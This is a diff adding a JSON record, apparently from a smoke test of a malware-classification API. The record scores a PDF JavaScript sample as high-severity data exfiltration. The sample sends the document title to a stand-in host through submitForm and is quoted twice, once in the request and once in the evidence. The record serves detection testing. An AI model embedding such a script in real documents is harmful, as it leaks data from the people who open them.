@@ -1,0 +1,69 @@
+{
+  "request": {
+    "script": "var u='https://collect.example.net/?d='+encodeURIComponent(this.info.Title);\nthis.submitForm({cURL:u});",
+    "instructions": "JavaScript found inside a supplier invoice PDF. Invoices never need scripts."
+  },
+  "response": {
+    "model": "clocked-1.0",
+    "malicious": 0.9950694318695676,
+    "suspicious": 0.9985,
+    "verdict": "malicious",
+    "threshold": 0.5,
+    "instructions_used": "custom",
+    "category": "data exfiltration",
+    "categories": {
+      "benign administration": 0.0014976960815562292,
+      "security blinding or EDR evasion": 0.002889573547078852,
+      "credential theft or memory dumping": 0.0024138460895704026,
+      "unauthorized persistence or access expansion": 0.001985302396559254,
+      "network reconnaissance or tunneling": 0.0030305634846383043,
+      "forensic destruction or anti-forensics": 0.0015155431118907034,
+      "ransomware or data destruction": 0.002022514060964728,
+      "obfuscated or in-memory payload": 0.002050942239541576,
+      "unsafe download or remote code execution": 0.002430315112290163,
+      "data exfiltration": 0.9801637038759098
+    },
+    "severity": "high",
+    "severity_expected": 3.853,
+    "severities": {
+      "none": 0.024281175299984494,
+      "low": 0.04821374798119684,
+      "medium": 0.19778995099882557,
+      "high": 0.5094610606208463,
+      "critical": 0.22025406509914686
+    },
+    "evidence": [
+      {
+        "line": "var u='https://collect.example.net/?d='+encodeURIComponent(this.info.Title);",
+        "start": 0,
+        "end": 76,
+        "confidence": 1
+      },
+      {
+        "line": "this.submitForm({cURL:u});",
+        "start": 77,
+        "end": 103,
+        "confidence": 1
+      }
+    ],
+    "timing": {
+      "read_ms": 50,
+      "total_ms": 51
+    }
+  },
+  "record": {
+    "id": "c7",
+    "endpoint": "script",
+    "label": "smoke:script",
+    "status": 200,
+    "ok": true,
+    "attempts": 1,
+    "credits": 2,
+    "costUsd": 0.000398,
+    "costBasis": "reference",
+    "modelMs": 48.340961,
+    "transport": "door:east",
+    "wallMs": 214,
+    "startedAt": "2026-11-03T18:50:06.598Z"
+  }
+}
